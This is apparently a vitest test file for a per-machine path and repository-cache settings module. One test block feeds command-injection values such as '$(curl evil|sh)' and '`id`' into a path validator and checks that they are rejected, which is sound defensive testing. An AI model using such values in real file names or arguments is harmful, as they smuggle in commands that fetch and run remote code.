/**
 * Per-machine settings file (#1950). Runs under the temp HOME from
 * test-lib/isolate-home.ts, so `local-config.json` is a real file there.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import path from 'node:path';
import { getLocalConfigPath } from './paths.js';
import {
  getMachinePath,
  getMachinePathSource,
  getMachineRepoCache,
  MACHINE_PATH_KEYS,
  setMachinePath,
  setMachineRepoCache,
} from './local-config.js';
import type { LocalRepoCache } from './state-schema.js';

function readStored(): Record<string, unknown> {
  return JSON.parse(fs.readFileSync(getLocalConfigPath(), 'utf8')) as Record<string, unknown>;
}

/** A real file under the temp home, so `existsSync` is true for it. */
function existingFile(name: string): string {
  const filePath = path.join(os.homedir(), name);
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, '# list\n');
  return filePath;
}

/** Full paths of the set-aside copies of an unreadable local-config.json. */
function rejectedCopies(): string[] {
  const dir = path.dirname(getLocalConfigPath());
  const names = fs.readdirSync(dir).filter((name) => name.startsWith('local-config.json.rejected-'));
  return names.map((name) => path.join(dir, name));
}

function cacheOf(paths: Record<string, string>): LocalRepoCache {
  const repos: LocalRepoCache['repos'] = {};
  for (const [name, repoPath] of Object.entries(paths)) {
    repos[name] = { path: repoPath, exists: true, currentBranch: 'main' };
  }
  return { repos, scanPaths: ['/scan'], cachedAt: '2026-11-19T00:00:00.000Z' };
}

beforeEach(() => {
  fs.rmSync(getLocalConfigPath(), { force: true });
});

describe('getMachinePath / setMachinePath', () => {
  it('returns undefined when neither a local nor a synced value exists, and writes nothing', () => {
    expect(getMachinePath('issueListPath', {})).toBeUndefined();
    expect(fs.existsSync(getLocalConfigPath())).toBe(false);
  });

  it('stores a value in local-config.json, private to the user, and reads it back', () => {
    setMachinePath('issueListPath', '/here/list.md');

    expect(getMachinePath('issueListPath', {})).toBe('/here/list.md');
    expect(readStored()).toEqual({ issueListPath: { path: '/here/list.md', source: 'set' } });
    expect(fs.statSync(getLocalConfigPath()).mode & 0o777).toBe(0o600);
  });

  it('prefers the local value over the synced one', () => {
    setMachinePath('skippedIssuesPath', '/here/skip.md');

    expect(getMachinePath('skippedIssuesPath', { skippedIssuesPath: '/other-machine/skip.md' })).toBe('/here/skip.md');
  });

  it('keeps the other key when one is set', () => {
    setMachinePath('issueListPath', '/here/list.md');
    setMachinePath('skippedIssuesPath', '/here/skip.md');

    expect(readStored()).toEqual({
      issueListPath: { path: '/here/list.md', source: 'set' },
      skippedIssuesPath: { path: '/here/skip.md', source: 'set' },
    });
  });

  it('a cleared value stays cleared even when the synced document still has one', () => {
    const synced = { issueListPath: existingFile('vault/list.md') };
    setMachinePath('issueListPath', undefined);

    expect(getMachinePath('issueListPath', synced)).toBeUndefined();
  });

  it('adopts a synced absolute path that exists on this machine', () => {
    const list = existingFile('vault/list.md');

    expect(getMachinePath('issueListPath', { issueListPath: list })).toBe(list);
    expect(readStored()).toEqual({ issueListPath: { path: list, source: 'adopted' } });
    // Another machine then overwrites the synced value: this one keeps its own.
    expect(getMachinePath('issueListPath', { issueListPath: '/other-machine/list.md' })).toBe(list);
  });

  it('does not adopt a synced path that is not on this machine, and returns it unchanged', () => {
    const foreign = path.join(os.homedir(), 'not-here', 'list.md');

    expect(getMachinePath('issueListPath', { issueListPath: foreign })).toBe(foreign);
    expect(fs.existsSync(getLocalConfigPath())).toBe(false);
  });

  it('does not adopt a relative synced path (callers resolve it and persist the absolute form)', () => {
    expect(getMachinePath('issueListPath', { issueListPath: 'package.json' })).toBe('package.json');
    expect(fs.existsSync(getLocalConfigPath())).toBe(false);
  });

  it('does not adopt a synced path that is a directory here', () => {
    const dir = path.dirname(existingFile('vault/list.md'));

    expect(getMachinePath('issueListPath', { issueListPath: dir })).toBe(dir);
    expect(fs.existsSync(getLocalConfigPath())).toBe(false);
  });

  it('sets an unreadable file aside as .rejected-<timestamp> instead of throwing or overwriting it', () => {
    fs.writeFileSync(getLocalConfigPath(), '{ not json');

    expect(getMachinePath('issueListPath', { issueListPath: '/synced/list.md' })).toBe('/synced/list.md');
    setMachinePath('issueListPath', '/here/list.md');

    const rejected = rejectedCopies();
    expect(rejected).toHaveLength(1);
    expect(fs.readFileSync(rejected[0], 'utf8')).toBe('{ not json');
    expect(getMachinePath('issueListPath', {})).toBe('/here/list.md');
    fs.rmSync(rejected[0]);
  });

  it('loads a file written before the source was recorded, treating a bare string as set', () => {
    fs.writeFileSync(getLocalConfigPath(), JSON.stringify({ issueListPath: '/here/list.md', skippedIssuesPath: '' }));

    expect(getMachinePath('issueListPath', {})).toBe('/here/list.md');
    expect(getMachinePathSource('issueListPath', {})).toBe('set');
    expect(getMachinePath('skippedIssuesPath', { skippedIssuesPath: '/synced/skip.md' })).toBeUndefined();
  });

  it('still returns the synced value when the adoption write fails', () => {
    const list = existingFile('vault/list.md');
    fs.mkdirSync(getLocalConfigPath());

    expect(getMachinePath('issueListPath', { issueListPath: list })).toBe(list);
    fs.rmSync(getLocalConfigPath(), { recursive: true });
  });
});

describe('path values a shell would interpret (#1934)', () => {
  const UNSAFE = ['$(curl evil|sh)', '`id`', '"', "'", '\\', ';', '|', '&', '<', '>', '\n', '\r', '\0'];
  const cases = MACHINE_PATH_KEYS.flatMap((key) => UNSAFE.map((bad) => [key, bad] as const));

  it.each(cases)('setMachinePath refuses %s containing %j and stores nothing', (key, bad) => {
    expect(() => setMachinePath(key, `/tmp/list${bad}.md`)).toThrow(/a path may not contain/);
    expect(fs.existsSync(getLocalConfigPath())).toBe(false);
  });

  it('accepts ordinary paths with spaces, dots, dashes and tildes', () => {
    setMachinePath('issueListPath', '/Users/me/My Vault/oss-list_v2.md');
    setMachinePath('skippedIssuesPath', '~/notes/skipped-issues.md');
    expect(readStored()).toMatchObject({
      issueListPath: { path: '/Users/me/My Vault/oss-list_v2.md' },
      skippedIssuesPath: { path: '~/notes/skipped-issues.md' },
    });
  });

  it('does not adopt a synced path with a shell metacharacter, even when the file exists here', () => {
    const planted = existingFile('vault/list$(id).md');
    expect(getMachinePath('issueListPath', { issueListPath: planted })).toBe(planted);
    expect(fs.existsSync(getLocalConfigPath())).toBe(false);
  });
});

describe('getMachinePathSource', () => {
  it('is undefined when nothing is configured and synced when only the shared config has a value', () => {
    expect(getMachinePathSource('issueListPath', {})).toBeUndefined();
    expect(getMachinePathSource('issueListPath', { issueListPath: '/other-machine/list.md' })).toBe('synced');
  });

  it('reports set, probe and adopted for local values', () => {
    const list = existingFile('vault/list.md');
    setMachinePath('skippedIssuesPath', '/here/skip.md', 'probe');
    getMachinePath('issueListPath', { issueListPath: list });

    expect(getMachinePathSource('skippedIssuesPath', {})).toBe('probe');
    expect(getMachinePathSource('issueListPath', { issueListPath: list })).toBe('adopted');
    setMachinePath('issueListPath', list);
    expect(getMachinePathSource('issueListPath', { issueListPath: list })).toBe('set');
  });

  it('reports set for an explicit clear, which still hides the synced value', () => {
    setMachinePath('issueListPath', undefined);

    expect(getMachinePathSource('issueListPath', { issueListPath: '/synced/list.md' })).toBe('set');
  });
});

describe('getMachineRepoCache / setMachineRepoCache', () => {
  it('returns undefined with no local and no synced cache', () => {
    expect(getMachineRepoCache(undefined)).toBeUndefined();
  });

  it('stores a scan locally and keeps the path settings', () => {
    const repo = existingFile('dev/repo/README.md');
    setMachinePath('issueListPath', '/here/list.md');
    setMachineRepoCache(cacheOf({ 'o/r': repo }));

    expect(getMachineRepoCache(undefined)).toEqual(cacheOf({ 'o/r': repo }));
    expect(getMachinePath('issueListPath', {})).toBe('/here/list.md');
  });

  it('drops entries whose path is gone on read, leaving the stored file as it was', () => {
    const repo = existingFile('dev/kept/README.md');
    const stored = cacheOf({ 'o/kept': repo, 'o/gone': path.join(os.homedir(), 'dev', 'gone') });
    setMachineRepoCache(stored);

    expect(getMachineRepoCache(undefined)).toEqual(cacheOf({ 'o/kept': repo }));
    expect(readStored()).toEqual({ localRepoCache: stored });
  });

  it('prefers the local cache over a synced one', () => {
    const repo = existingFile('dev/mine/README.md');
    setMachineRepoCache(cacheOf({ 'o/mine': repo }));

    const synced = cacheOf({ 'o/theirs': existingFile('dev/theirs/README.md') });

    expect(getMachineRepoCache(synced)).toEqual(cacheOf({ 'o/mine': repo }));
  });

  it('adopts a synced cache once, without the entries that are not on this disk', () => {
    const repo = existingFile('dev/here/README.md');
    const synced = cacheOf({ 'o/here': repo, 'o/elsewhere': '/other-machine/dev/elsewhere' });

    expect(getMachineRepoCache(synced)).toEqual(cacheOf({ 'o/here': repo }));
    expect(readStored()).toEqual({ localRepoCache: cacheOf({ 'o/here': repo }) });
  });

  it('ignores a synced cache with no repo on this disk: another machine wrote it', () => {
    expect(getMachineRepoCache(cacheOf({ 'o/r': '/other-machine/dev/r' }))).toBeUndefined();
    expect(fs.existsSync(getLocalConfigPath())).toBe(false);
  });

  it('adopts an empty synced cache as an empty cache', () => {
    expect(getMachineRepoCache(cacheOf({}))).toEqual(cacheOf({}));
  });
});
